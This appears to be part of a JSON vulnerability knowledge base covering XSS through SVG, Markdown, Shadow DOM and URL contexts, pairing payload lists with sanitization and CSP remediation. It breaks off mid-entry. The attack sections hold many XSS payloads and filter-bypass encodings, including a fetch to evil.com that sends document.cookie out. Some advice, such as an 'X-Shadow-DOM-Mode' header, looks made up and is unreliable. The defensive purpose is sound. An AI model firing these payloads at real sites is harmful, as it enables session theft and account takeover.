    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "svg",
      "vector",
      "html",
      "injection"
    ],
    "description": "\nSVG (Scalable Vector Graphics) files can contain embedded JavaScript and are increasingly used in \nmodern web applications. SVG XSS is particularly dangerous because SVG can be embedded inline in HTML, \nloaded as external files, used in <img> tags, or uploaded by users. Many developers and sanitizers \nfail to properly handle SVG attack vectors, making this a high-risk vulnerability.\n\nSVG is XML-based, which means it supports scripting, event handlers, and can include HTML through \nforeignObject. This makes SVG a powerful but dangerous format for user-generated content.\n\nSEVERITY: HIGH\nCommon in file upload functionality, profile pictures, and user-generated graphics.\n",
    "attack_vector": "\nSVG XSS ATTACK VECTORS:\n\n1. BASIC ONLOAD:\n   <svg onload=alert(1)>\n   <svg onload=\"alert(document.domain)\">\n   <svg/onload=alert`1`>\n\n2. ANIMATE ELEMENT:\n   <svg><animate onbegin=alert(1) attributeName=x dur=1s>\n   <svg><animate onend=alert(1) attributeName=x dur=1s>\n   <svg><animate onrepeat=alert(1) attributeName=x dur=1s>\n\n3. SET ELEMENT:\n   <svg><set onbegin=alert(1) attributeName=x to=0>\n   <svg><set onend=alert(1) attributeName=x>\n\n4. SCRIPT TAG IN SVG:\n   <svg><script>alert(1)</script></svg>\n   <svg><script>alert(document.cookie)</script></svg>\n   <svg><script xlink:href=\"data:,alert(1)\"></script></svg>\n   <svg><script href=\"data:,alert(1)\"></script></svg>\n\n5. FOREIGNOBJECT WITH HTML:\n   <svg><foreignObject><body onload=alert(1)></foreignObject></svg>\n   <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>\n   <svg><foreignObject><iframe src=\"javascript:alert(1)\"></foreignObject></svg>\n\n6. USE ELEMENT:\n   <svg><use href=\"data:image/svg+xml,<svg id=x onload=alert(1)>\"/></svg>\n   <svg><use xlink:href=\"data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=\"/></svg>\n\n7. IMAGE WITH XLINK:\n   <svg><image xlink:href=\"javascript:alert(1)\"></image></svg>\n   <svg><image href=\"javascript:alert(1)\"></image></svg>\n\n8. A TAG IN SVG:\n   <svg><a xlink:href=\"javascript:alert(1)\"><text>Click</text></a></svg>\n   <svg><a href=\"javascript:alert(1)\"><text>Click</text></a></svg>\n\n9. SVG IN DATA URI:\n   <img src=\"data:image/svg+xml,<svg onload=alert(1)>\">\n   <img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">\n   <object data=\"data:image/svg+xml,<svg onload=alert(1)>\">\n\n10. SVG WITH MULTIPLE VECTORS:\n    <svg><script>alert(1)</script><rect onload=alert(2)></svg>\n    <svg onload=alert(1)><script>alert(2)</script></svg>\n\n11. FILTER ELEMENT:\n    <svg><filter id=x><feImage xlink:href=\"data:,alert(1)\"></filter></svg>\n\n12. PATTERN ELEMENT:\n    <svg><pattern><image xlink:href=\"javascript:alert(1)\"></pattern></svg>\n\n13. MARKER ELEMENT:\n    <svg><marker><image xlink:href=\"javascript:alert(1)\"></marker></svg>\n\n14. SVG POLYGLOTS (Works in multiple contexts):\n    <svg/onload=alert(1)//\n    \"><svg onload=alert(1)>\n    javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><svg onload=alert(1)>\n\n15. CASE VARIATIONS:\n    <sVg OnLoAd=alert(1)>\n    <SVG ONLOAD=ALERT(1)>\n\n16. ATTRIBUTE ENCODING:\n    <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>\n    <svg onload=\"&#97;&#108;&#101;&#114;&#116;(1)\">\n\n17. EVENT HANDLERS:\n    <svg onfocus=alert(1) autofocus>\n    <svg onmouseover=alert(1)>\n    <svg onclick=alert(1)>\n\n18. NESTED SVG:\n    <svg><svg onload=alert(1)></svg></svg>\n\n19. SVG WITH STYLE:\n    <svg><style>*{fill:url(\"javascript:alert(1)\")}</style></svg>\n\n20. UPLOADED SVG FILES:\n    User uploads malicious.svg containing:\n    <?xml version=\"1.0\"?>\n    <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">\n      <script>alert(document.cookie)</script>\n    </svg>\n",
    "remediation": "\nDEFENSE STRATEGY:\n\n1. SVG SANITIZATION:\n   \n   Use DOMPurify with SVG support:\n   import DOMPurify from 'dompurify';\n   \n   const cleanSVG = DOMPurify.sanitize(dirtySVG, {\n       USE_PROFILES: {svg: true, svgFilters: true},\n       ADD_TAGS: ['use'],  // If needed\n       FORBID_TAGS: ['script', 'foreignObject'],\n       FORBID_ATTR: ['onload', 'onerror', 'onbegin', 'onend']\n   });\n\n2. SERVER-SIDE VALIDATION:\n   \n   Python example:\n   import xml.etree.ElementTree as ET\n   from defusedxml import ElementTree as DefusedET\n   \n   def sanitize_svg(svg_content):\n       # Parse with defusedxml to prevent XXE\n       tree = DefusedET.fromstring(svg_content)\n       \n       # Remove dangerous elements\n       dangerous_tags = ['script', 'foreignObject', 'use']\n       for tag in dangerous_tags:\n           for elem in tree.findall(f'.//{tag}'):\n               tree.remove(elem)\n       \n       # Remove event handlers\n       for elem in tree.iter():\n           attrs_to_remove = []\n           for attr in elem.attrib:\n               if attr.startswith('on'):\n                   attrs_to_remove.append(attr)\n           for attr in attrs_to_remove:\n               del elem.attrib[attr]\n       \n       return ET.tostring(tree)\n\n3. CONTENT-TYPE HEADERS:\n   \n   Always serve SVG with correct MIME type:\n   Content-Type: image/svg+xml\n   \n   NEVER:\n   Content-Type: text/html\n\n4. CONTENT SECURITY POLICY:\n   \n   Restrict SVG execution:\n   Content-Security-Policy: \n     default-src 'self';\n     img-src 'self' data:;\n     script-src 'self';\n\n5. FILE UPLOAD PROTECTION:\n   \n   For user-uploaded SVG:\n   a) Convert to raster format (PNG/JPEG) using ImageMagick/PIL:\n      convert malicious.svg safe.png\n   \n   b) Or sanitize and re-render server-side\n   \n   c) Or serve with Content-Disposition: attachment:\n      Content-Disposition: attachment; filename=\"file.svg\"\n      (Forces download instead of rendering)\n\n6. WHITELIST SAFE ELEMENTS:\n   \n   Safe SVG elements:\n   - svg, g, path, rect, circle, ellipse, line, polyline, polygon\n   - text, tspan, textPath\n   - defs, clipPath, mask\n   - linearGradient, radialGradient, stop\n   \n   Dangerous elements to remove:\n   - script\n   - foreignObject\n   - use (can load external content)\n   - image (can have javascript: href)\n   - a (can have javascript: href)\n   - animate, set (with onbegin/onend)\n   - feImage (in filters)\n\n7. REMOVE EVENT HANDLERS:\n   \n   Remove all attributes starting with 'on':\n   - onload, onerror, onclick, onmouseover\n   - onbegin, onend, onrepeat\n   - onfocus, onblur, etc.\n\n8. VALIDATE HREF ATTRIBUTES:\n   \n   Check xlink:href and href:\n   - Block javascript: protocol\n   - Block data: URIs (unless whitelisted)\n   - Only allow http:, https:, or # (same-document references)\n\n9. USE SVG SANITIZATION LIBRARIES:\n   \n   JavaScript:\n   - DOMPurify with SVG profile\n   - svg-sanitizer\n   \n   Python:\n   - bleach with SVG sanitizer\n   - defusedxml (prevents XXE)\n   \n   PHP:\n   - enshrined/svg-sanitize\n\n10. ALTERNATIVE: CONVERT TO SAFE FORMAT:\n    \n    If SVG features not needed, convert to PNG:\n    \n    Python (using cairosvg):\n    import cairosvg\n    cairosvg.svg2png(url='input.svg', write_to='output.png')\n    \n    This completely removes any XSS risk\n\nSECURITY CHECKLIST:\n\n[ ] SVG sanitization implemented\n[ ] DOMPurify or equivalent library used\n[ ] Script tags stripped from SVG\n[ ] Event handlers removed\n[ ] foreignObject element blocked\n[ ] use element with external href blocked\n[ ] Correct Content-Type header set\n[ ] CSP configured for SVG\n[ ] File uploads: convert to raster or sanitize\n[ ] xlink:href validated (no javascript:)\n[ ] Content-Disposition: attachment for downloads\n[ ] defusedxml used for parsing (prevents XXE)\n[ ] Regular security testing of SVG handling\n\nTESTING PAYLOADS:\n\nBasic:\n<svg onload=alert(1)>\n\nAnimate:\n<svg><animate onbegin=alert(1) attributeName=x dur=1s>\n\nScript:\n<svg><script>alert(1)</script></svg>\n\nForeignObject:\n<svg><foreignObject><body onload=alert(1)></foreignObject></svg>\n\nData URI:\ndata:image/svg+xml,<svg onload=alert(1)>\n\nTOOLS:\n- DOMPurify: https://github.com/cure53/DOMPurify\n- svg-sanitizer: https://github.com/darylldoyle/svg-sanitizer\n- defusedxml: https://github.com/tiran/defusedxml\n\nREFERENCES:\n- OWASP XSS Prevention Cheat Sheet\n- SVG Security: https://www.w3.org/TR/SVG/security.html\n- CWE-79: Cross-site Scripting\n"
  },
  "markdown_context": {
    "title": "Cross-Site Scripting (XSS) via Markdown Rendering",
    "severity": "medium",
    "cvss_score": 6.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "markdown",
      "html",
      "stored",
      "renderer"
    ],
    "description": "\nMany web applications allow users to input Markdown for rich text formatting. However, Markdown parsers \noften support raw HTML and JavaScript execution vectors. Different implementations have varying security \nproperties. Improperly configured renderers can lead to stored XSS in comments, documentation, and wikis.\n\nSEVERITY: HIGH\nVery common in GitHub-style applications, forums, wikis, and comment systems.\n",
    "attack_vector": "\nRAW HTML IN MARKDOWN:\n[Click me](javascript:alert(1))\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nIMAGE TAGS WITH JAVASCRIPT:\n![alt](javascript:alert(1))\n\nIFRAME INJECTION:\n<iframe src=javascript:alert(1)>\n\nDATA URLS:\n[link](data:text/html,<script>alert(1)</script>)\n\nAUTOLINK ABUSE:\n<javascript:alert(1)>\n\nREFERENCE-STYLE LINKS:\n[link][1]\n[1]: javascript:alert(1)\n\nHTML INJECTION IN CODE BLOCKS:\nIf parser doesn't properly escape\n\nMUTATION XSS:\nPayloads that look safe but become dangerous after parsing\n",
    "remediation": "\nDEFENSE:\n\n1. USE MARKDOWN PARSERS WITH SAFE DEFAULTS\n   - markdown-it with html: false\n   - marked with sanitize: true\n   - CommonMark with HTML disabled\n\n2. HTML SANITIZATION AFTER RENDERING\n   Use DOMPurify, Bleach, or OWASP Java HTML Sanitizer\n\n3. WHITELIST SAFE TAGS AND ATTRIBUTES\n   Allow: <b>, <i>, <em>, <strong>, <a href>, <img src>\n   Block: <script>, <iframe>, <object>, <embed>\n\n4. URL PROTOCOL WHITELISTING\n   Only allow: http://, https://, mailto:\n   Block: javascript:, data:, vbscript:\n\n5. USE REL ATTRIBUTES\n   rel='nofollow noopener noreferrer' on all links\n\n6. IMPLEMENT CSP\n\n7. VALIDATE ON BOTH CLIENT AND SERVER\n\nJavaScript (DOMPurify):\nimport DOMPurify from 'dompurify';\nimport marked from 'marked';\nconst html = marked(markdown);\nconst clean = DOMPurify.sanitize(html);\n\nPython (Bleach):\nimport bleach\nimport markdown\nhtml = markdown.markdown(text)\nclean = bleach.clean(html,\n    tags=['b', 'i', 'u', 'em', 'strong', 'a'],\n    attributes={'a': ['href', 'title']},\n    protocols=['http', 'https', 'mailto']\n)\n\nOWASP REFERENCES:\n- CWE-79: Cross-site Scripting\n- OWASP Markdown Security\n"
  },
  "shadow_dom_xss": {
    "title": "Cross-Site Scripting (XSS) in Shadow DOM Context",
    "severity": "high",
    "cvss_score": 7.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "shadow-dom",
      "web-components",
      "encapsulation",
      "modern-web"
    ],
    "description": "\nShadow DOM XSS occurs when user input is reflected into Shadow DOM elements or when Shadow DOM\nboundaries are manipulated to break encapsulation. Shadow DOM provides encapsulation for web\ncomponents, but when malicious content is injected into shadow trees or when shadow boundaries\nare crossed inappropriately, it can lead to XSS attacks that bypass traditional DOM protections.\n\nVULNERABILITY CONTEXT:\nShadow DOM XSS typically happens when:\n1. User content is inserted into shadow DOM without sanitization\n2. Component slots contain malicious content\n3. Shadow DOM templates are dynamically generated\n4. Custom element attributes contain executable code\n5. Shadow root mode is manipulated\n6. Event delegation across shadow boundaries\n\nCommon in:\n- Web Components frameworks (Lit, FAST, Stencil)\n- UI component libraries\n- Custom element implementations\n- Widget systems\n- Plugin architectures\n- Template engines\n- Component-based applications\n\nSEVERITY: HIGH\nShadow DOM XSS can bypass traditional XSS protections and Content Security Policies in some cases.\nThe encapsulation makes detection challenging, and attacks can persist within component boundaries.\n",
    "attack_vector": "\nSHADOW DOM XSS ATTACK VECTORS:\n\n1. SLOT CONTENT INJECTION:\n   Custom element with slot:\n   <user-profile>\n     <span slot=\"name\">USER_INPUT</span>  <!-- Slot injection -->\n   </user-profile>\n\n   Component template:\n   <template>\n     <div class=\"profile\">\n       <h2><slot name=\"name\"></slot></h2>  <!-- XSS in slot -->\n     </div>\n   </template>\n\n2. SHADOW DOM INNER HTML INJECTION:\n   Direct shadow DOM manipulation:\n   const shadow = element.attachShadow({mode: 'open'});\n   shadow.innerHTML = USER_INPUT;  // Direct injection\n\n3. CUSTOM ELEMENT ATTRIBUTE INJECTION:\n   Custom element attributes:\n   <my-component title=\"USER_INPUT\"></my-component>\n\n   Component code:\n   connectedCallback() {\n     this.shadowRoot.innerHTML = '<h1>' + this.getAttribute('title') + '</h1>';\n   }\n\n4. TEMPLATE SLOT INJECTION:\n   Template with dynamic slots:\n   const template = document.createElement('template');\n   template.innerHTML = USER_INPUT;  <!-- Template injection -->\n\n   const shadow = element.attachShadow({mode: 'open'});\n   shadow.appendChild(template.content.cloneNode(true));\n\n5. SHADOW ROOT MODE MANIPULATION:\n   Shadow root mode injection:\n   const shadow = element.attachShadow({\n     mode: USER_INPUT  // Mode injection\n   });\n\n   Attack payload:\n   'open<script>alert(1)</script>'\n\nADVANCED SHADOW DOM XSS TECHNIQUES:\n\n6. CUSTOM ELEMENT TAG NAME INJECTION:\n   Creating elements with XSS names:\n   const tagName = USER_INPUT;  // Tag name injection\n   customElements.define(tagName, MyComponent);\n\n   Attack payload:\n   <script>alert(1)</script>\n\n7. CONSTRUCTOR INJECTION:\n   Custom element constructor injection:\n   class MaliciousComponent extends HTMLElement {\n     constructor() {\n       super();\n       this.shadowRoot.innerHTML = USER_INPUT;  // Constructor injection\n     }\n   }\n\n8. ATTRIBUTE OBSERVER INJECTION:\n   Mutation observer with XSS:\n   const observer = new MutationObserver(function(mutations) {\n     mutations.forEach(function(mutation) {\n       if (mutation.type === 'attributes') {\n         const value = mutation.target.getAttribute('data-user');\n         this.shadowRoot.getElementById('display').innerHTML = value;  // XSS\n       }\n     });\n   });\n\n9. EVENT LISTENER INJECTION:\n   Event delegation across shadow boundaries:\n   element.addEventListener('click', function(event) {\n     const target = event.target;\n     if (target.matches(USER_INPUT)) {  // Selector injection\n       // XSS execution\n     }\n   });\n\n10. CSS CUSTOM PROPERTY INJECTION:\n    Shadow DOM styles with XSS:\n    const style = document.createElement('style');\n    style.textContent = ':host { --user-color: ' + USER_INPUT + '; }';  // CSS injection\n\n    this.shadowRoot.appendChild(style);\n\n11. SHADOW DOM QUERY SELECTOR INJECTION:\n    Querying shadow DOM with XSS:\n    const selector = USER_INPUT;  // Selector injection\n    const elements = this.shadowRoot.querySelectorAll(selector);\n\n12. FRAGMENT DIRECTIVE INJECTION:\n    Shadow DOM template fragments:\n    const template = document.createElement('template');\n    template.innerHTML = '<div>' + USER_INPUT + '</div>';  // Fragment injection\n\n13. SHADOW ROOT ADOPTION:\n    Adopting shadow trees with XSS:\n    const shadowTree = document.createElement('div');\n    shadowTree.innerHTML = USER_INPUT;  // Tree injection\n\n    const shadow = element.attachShadow({mode: 'open'});\n    shadow.appendChild(shadowTree);\n\n14. CUSTOM ELEMENT REGISTRY INJECTION:\n    Global registry manipulation:\n    const componentName = USER_INPUT;  // Component name injection\n    customElements.define(componentName, MaliciousComponent);\n\n15. SHADOW BOUNDARY CROSSING:\n    Crossing shadow boundaries:\n    const host = document.querySelector('my-component');\n    const shadow = host.shadowRoot;\n\n    // Inject into shadow from outside\n    const slot = shadow.querySelector('slot');\n    slot.innerHTML = USER_INPUT;  // Boundary crossing\n\nSHADOW DOM-SPECIFIC BYPASSES:\n\n16. CLOSED SHADOW DOM ESCAPE:\n    Escaping closed shadow boundaries:\n    const shadow = element.attachShadow({mode: 'closed'});\n    shadow.innerHTML = USER_INPUT;  // Still vulnerable to injection\n\n17. TEMPLATE CLONING ATTACK:\n    Template cloning with XSS:\n    const template = document.createElement('template');\n    template.innerHTML = '<div><slot></slot></div>';\n\n    const clone = template.content.cloneNode(true);\n    clone.querySelector('slot').innerHTML = USER_INPUT;  // Clone injection\n\n18. FRAGMENT COMPOSITION:\n    Multiple fragments with coordinated attack:\n    fragment1.innerHTML = '<div>';\n    fragment2.innerHTML = USER_INPUT;  // XSS fragment\n    fragment3.innerHTML = '</div>';\n\n19. ATTRIBUTE REFLECTION:\n    Reflecting attributes through shadow DOM:\n    const attribute = element.getAttribute('data-user');\n    this.shadowRoot.innerHTML = '<span data-value=\"' + attribute + '\"></span>';\n\n20. EVENT BUBBLING MANIPULATION:\n    Event bubbling through shadow boundaries:\n    this.shadowRoot.addEventListener('custom-event', function(event) {\n      document.body.innerHTML = event.detail.data;  // XSS through events\n    });\n\nREAL-WORLD ATTACK SCENARIOS:\n\n21. UI COMPONENT LIBRARY:\n    - Third-party component library\n    - Component props: <script>alert(1)</script>\n    - Rendered in shadow DOM\n    - Affects all library users\n\n22. WIDGET PLATFORM:\n    - Embeddable widgets\n    - Widget config: <script>alert(1)</script>\n    - Widget rendered in shadow DOM\n    - Affects all widget consumers\n\n23. PLUGIN SYSTEM:\n    - Browser extension plugins\n    - Plugin manifest: <script>alert(1)</script>\n    - Plugin UI in shadow DOM\n    - Extension compromise\n\n24. WEB COMPONENT FRAMEWORK:\n    - Lit, FAST, or Stencil components\n    - Component properties: <script>alert(1)</script>\n    - Template rendering\n    - Framework-wide XSS\n\n25. DASHBOARD WIDGETS:\n    - Configurable dashboard\n    - Widget title: <script>alert(1)</script>\n    - Widget content in shadow DOM\n    - Dashboard compromise\n\n26. FORM BUILDER:\n    - Dynamic form generation\n    - Field label: <script>alert(1)</script>\n    - Form fields in shadow DOM\n    - Form submission hijacking\n\n27. CHAT WIDGET:\n    - Live chat component\n    - User message: <script>alert(1)</script>\n    - Message display in shadow DOM\n    - Chat session hijacking\n\nSHADOW DOM XSS DETECTION:\n\n28. MANUAL TESTING:\n    - DevTools Elements inspection\n    - Shadow DOM expansion in DevTools\n    - Component property testing\n    - Event listener monitoring\n\n29. AUTOMATED SCANNING:\n    - Shadow DOM tree traversal\n    - Component property injection\n    - Template analysis\n    - Encapsulation testing\n\n30. BROWSER EXTENSIONS:\n    - Shadow DOM inspection tools\n    - Component analysis extensions\n    - DOM tree visualization\n",
    "remediation": "\nSHADOW DOM XSS DEFENSE STRATEGY:\n\n1. CONTENT SANITIZATION (PRIMARY DEFENSE):\n   Sanitize all content before inserting into Shadow DOM:\n\n   JavaScript sanitization:\n   function sanitizeForShadowDOM(content) {\n     if (typeof content !== 'string') return content;\n\n     return DOMPurify.sanitize(content, {\n       ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span'],\n       ALLOWED_ATTR: ['class', 'id', 'title']\n     });\n   }\n\n   Python backend:\n   import bleach\n   clean_content = bleach.clean(user_content, tags=['b', 'i', 'em'], strip=True)\n\n2. SLOT CONTENT VALIDATION:\n   Validate content in named slots:\n\n   class SecureComponent extends HTMLElement {\n     connectedCallback() {\n       const nameSlot = this.querySelector('[slot=\"name\"]');\n       if (nameSlot) {\n         const cleanContent = sanitizeForShadowDOM(nameSlot.textContent);\n         this.shadowRoot.getElementById('name-display').textContent = cleanContent;\n       }\n     }\n   }\n\n3. CUSTOM ELEMENT SECURITY:\n   Secure custom element implementation:\n\n   class SecureElement extends HTMLElement {\n     constructor() {\n       super();\n       this.attachShadow({mode: 'open'});\n\n       // Use textContent instead of innerHTML\n       this.shadowRoot.textContent = 'Loading...';\n\n       // Validate all attributes\n       this.validateAttributes();\n     }\n\n     validateAttributes() {\n       const attributes = ['title', 'data-value', 'aria-label'];\n       attributes.forEach(attr => {\n         const value = this.getAttribute(attr);\n         if (value) {\n           const cleanValue = sanitizeForShadowDOM(value);\n           this.setAttribute(attr, cleanValue);\n         }\n       });\n     }\n   }\n\n4. TEMPLATE SECURITY:\n   Secure template usage:\n\n   const secureTemplate = document.createElement('template');\n   const cleanHTML = sanitizeForShadowDOM(userHTML);\n   secureTemplate.innerHTML = cleanHTML;\n\n   // Clone and use securely\n   const content = secureTemplate.content.cloneNode(true);\n   this.shadowRoot.appendChild(content);\n\n5. ATTRIBUTE VALIDATION:\n   Validate all element attributes:\n\n   function validateElementAttributes(element) {\n     const attributes = element.attributes;\n\n     for (let i = 0; i < attributes.length; i++) {\n       const attr = attributes[i];\n       const cleanValue = sanitizeForShadowDOM(attr.value);\n\n       if (cleanValue !== attr.value) {\n         element.setAttribute(attr.name, cleanValue);\n       }\n     }\n   }\n\n6. SHADOW DOM MODE SECURITY:\n   Use appropriate shadow DOM modes:\n\n   // For public components, use 'open' mode\n   this.attachShadow({mode: 'open'});\n\n   // For secure components, use 'closed' mode\n   this.attachShadow({mode: 'closed'});\n\n   // But validate content regardless of mode\n\n7. EVENT HANDLER SECURITY:\n   Secure event handling across shadow boundaries:\n\n   this.shadowRoot.addEventListener('click', function(event) {\n     const target = event.target;\n\n     // Validate target before processing\n     if (!isValidTarget(target)) {\n       event.stopPropagation();\n       return;\n     }\n\n     // Safe event processing\n     handleClick(target);\n   });\n\n8. CSS CUSTOM PROPERTIES SECURITY:\n   Secure CSS custom properties:\n\n   function setSecureCustomProperty(property, value) {\n     const cleanValue = sanitizeForShadowDOM(value);\n\n     // Validate property name\n     if (!isValidCSSProperty(property)) {\n       throw new Error('Invalid CSS property');\n     }\n\n     this.shadowRoot.style.setProperty(property, cleanValue);\n   }\n\n9. COMPONENT REGISTRY SECURITY:\n   Secure custom element registration:\n\n   function registerSecureComponent(name, componentClass) {\n     // Validate component name\n     if (!isValidComponentName(name)) {\n       throw new Error('Invalid component name');\n     }\n\n     // Validate component class\n     if (!isSecureComponent(componentClass)) {\n       throw new Error('Insecure component class');\n     }\n\n     customElements.define(name, componentClass);\n   }\n\n10. SHADOW DOM BOUNDARY PROTECTION:\n    Protect shadow DOM boundaries:\n\n    // Prevent external access to shadow DOM\n    Object.defineProperty(this, 'shadowRoot', {\n      get: function() {\n        if (this.mode === 'closed') {\n          return null;  // Hide closed shadow DOM\n        }\n        return this.__shadowRoot;\n      }\n    });\n\n11. INPUT VALIDATION:\n    Comprehensive input validation:\n\n    const VALIDATION_RULES = {\n      maxLength: 1000,\n      allowedChars: /^[a-zA-Z0-9\\s\\.,!?\\-_]+$/,\n      blockedPatterns: [\n        /<script\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi,\n        /javascript:/gi,\n        /vbscript:/gi,\n        /on\\w+\\s*=/gi\n      ]\n    };\n\n12. CSP FOR SHADOW DOM:\n    Content Security Policy:\n\n    Content-Security-Policy:\n      default-src 'self';\n      script-src 'self' 'nonce-{random}';\n      style-src 'self' 'unsafe-inline';  // For component styles\n      connect-src 'self';\n      object-src 'none';\n\n13. ERROR HANDLING:\n    Secure error handling:\n\n    try {\n      this.shadowRoot.innerHTML = userContent;\n    } catch (error) {\n      logger.error('Shadow DOM error', {\n        error: error.message,\n        component: this.tagName\n      });\n\n      // Show safe fallback\n      this.shadowRoot.innerHTML = '<div>Safe content</div>';\n    }\n\n14. LOGGING AND MONITORING:\n    Comprehensive Shadow DOM monitoring:\n\n    function logComponentEvent(event, details) {\n      logger.info('Component event', {\n        event: event,\n        component: details.tagName,\n        timestamp: new Date().toISOString()\n      });\n    }\n\n15. TESTING AND VALIDATION:\n    Regular security testing:\n\n    Automated tests:\n    - Shadow DOM content validation\n    - Slot content testing\n    - Component attribute testing\n    - Boundary crossing validation\n\n    Manual tests:\n    - DevTools Shadow DOM inspection\n    - Component property testing\n    - Template security analysis\n\nSECURITY TESTING PAYLOADS:\n\nBasic Shadow DOM XSS:\n<script>alert('Shadow DOM XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nSlot injection:\n<span slot=\"content\"><script>alert(1)</script></span>\n<div slot=\"header\"><img src=x onerror=alert(1)></div>\n\nAttribute injection:\n<my-component data-value=\"<script>alert(1)</script>\"></my-component>\n<user-profile title=\"<img src=x onerror=alert(1)>\"></user-profile>\n\nAdvanced payloads:\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\nvbscript:msgbox(1)\n\nSHADOW DOM SECURITY HEADERS:\n\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\nX-Shadow-DOM-Mode: secure\n\nMONITORING METRICS:\n\nMonitor for:\n- Shadow DOM creation patterns\n- Custom element registration\n- Slot content anomalies\n- Component attribute changes\n- Boundary crossing attempts\n\nOWASP REFERENCES:\n- OWASP Web Components Security\n- OWASP Shadow DOM Cheat Sheet\n- Web Components Security Best Practices\n- DOM Encapsulation Security\n"
  },
  "url_context": {
    "title": "Cross-Site Scripting (XSS) in URL/URI Context",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    "reliability": "certain",
    "cwe": [
      "CWE-79"
    ],
    "owasp": [
      "A03:2021"
    ],
    "tags": [
      "xss",
      "url",
      "protocol",
      "javascript",
      "data-uri"
    ],
    "description": "\nUser input is reflected within a URL, typically in href, src, action, formaction, or data attributes. \nThis enables protocol-based attacks and is particularly dangerous because users may be socially engineered \nto click malicious links. Modern browsers have improved protection, but many bypass techniques exist, \nespecially in mobile browsers, WebViews, and legacy systems.\n\nVULNERABILITY CONTEXT:\nOccurs when URLs contain user-controlled data:\n- <a href=\"USER_INPUT\">Link</a>\n- <img src=\"USER_INPUT\">\n- <iframe src=\"USER_INPUT\">\n- <script src=\"USER_INPUT\">\n- <link href=\"USER_INPUT\">\n- <form action=\"USER_INPUT\">\n- <button formaction=\"USER_INPUT\">\n- <video src=\"USER_INPUT\">\n- <audio src=\"USER_INPUT\">\n- <embed src=\"USER_INPUT\">\n- <object data=\"USER_INPUT\">\n- <base href=\"USER_INPUT\">\n- <meta content=\"url=USER_INPUT\">\n- window.location = USER_INPUT\n- window.open(USER_INPUT)\n\nCommon in:\n- Redirect parameters (?redirect=URL)\n- OAuth callbacks (?callback_url=URL)\n- File downloads (?file=URL)\n- Image galleries (?image=URL)\n- RSS feed URLs\n- Social media share links\n- Email verification links\n- Password reset links\n- Deep link handlers\n- URL shorteners\n\nSEVERITY: HIGH to CRITICAL\nCan lead to phishing, credential theft, CSRF, malware delivery, and full account compromise.\n",
    "attack_vector": "\nJAVASCRIPT PROTOCOL ATTACKS:\n\n1. BASIC JAVASCRIPT PROTOCOL:\n   <a href=\"javascript:alert(1)\">Click</a>\n   <a href=\"javascript:alert(document.cookie)\">Click</a>\n   <a href=\"javascript:fetch('//evil.com?c='+document.cookie)\">Click</a>\n\n2. JAVASCRIPT WITH VOID:\n   javascript:void(alert(1))\n   javascript:void(document.location='//evil.com')\n\n3. JAVASCRIPT IN IMG/IFRAME:\n   <img src=\"javascript:alert(1)\">  (Blocked in modern browsers)\n   <iframe src=\"javascript:alert(1)\">\n\n4. JAVASCRIPT WITH COMMENTS:\n   javascript:/*comment*/alert(1)\n   javascript://comment%0Aalert(1)\n\nDATA URI ATTACKS:\n\n5. DATA URI WITH HTML:\n   data:text/html,<script>alert(1)</script>\n   data:text/html,<img src=x onerror=alert(1)>\n   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n\n6. DATA URI IN IFRAME:\n   <iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>\n\n7. DATA URI WITH CHARSET:\n   data:text/html;charset=utf-7,+ADw-script+AD4-alert(1)+ADw-/script+AD4-\n\n8. DATA URI IN IMG (Limited):\n   data:image/svg+xml,<svg onload=alert(1)>\n   data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\n\nENCODING BYPASSES:\n\n9. URL ENCODING:\n   javascript:%61lert(1)  (%61 = 'a')\n   javascript:al%65rt(1)  (%65 = 'e')\n   javascript:%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\n\n10. DOUBLE URL ENCODING:\n    javascript:%2561lert(1)  (%25 = '%', then %61 = 'a')\n\n11. UNICODE ENCODING:\n    javascript:\\u0061lert(1)\n    javascript:al\\u0065rt(1)\n\n12. HEX ENCODING:\n    javascript:\\x61lert(1)\n    javascript:al\\x65rt(1)\n\n13. MIXED ENCODING:\n    javascript:%61l\\u0065rt(1)\n    j%61v%61script:alert(1)\n\nCASE VARIATION BYPASSES:\n\n14. MIXED CASE:\n    JaVaScRiPt:alert(1)\n    jAvAsCrIpT:alert(1)\n    JAVASCRIPT:alert(1)\n\n15. CASE WITH ENCODING:\n    JaVaScRiPt:%61lert(1)\n    j%61vaScRiPt:alert(1)\n\nWHITESPACE AND SPECIAL CHARACTERS:\n\n16. TAB CHARACTER:\n    java\\tscript:alert(1)\n    jav&#x09;ascript:alert(1)\n    jav%09ascript:alert(1)\n\n17. NEWLINE CHARACTER:\n    